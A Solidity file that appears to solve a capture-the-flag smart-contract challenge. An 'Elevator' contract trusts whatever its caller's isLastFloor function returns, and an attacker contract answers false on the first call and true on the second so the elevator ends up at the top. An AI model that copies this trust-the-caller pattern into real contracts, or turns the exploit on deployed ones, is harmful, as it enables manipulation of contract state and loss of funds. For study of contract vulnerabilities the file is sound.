// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

interface IElevator {
    function goTo(uint) external;
}

contract DefinatelyABuilding is Building {
    IElevator elevator;

    bool public secondCall = false;

    constructor(address _targetAddress) public {
        elevator = IElevator(_targetAddress);
    }

    function reachTop() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint) external returns (bool) {
        if (!secondCall) {
            secondCall = true;
            return false;
        } else {
            secondCall = false;
            return true;
        }
    }
}
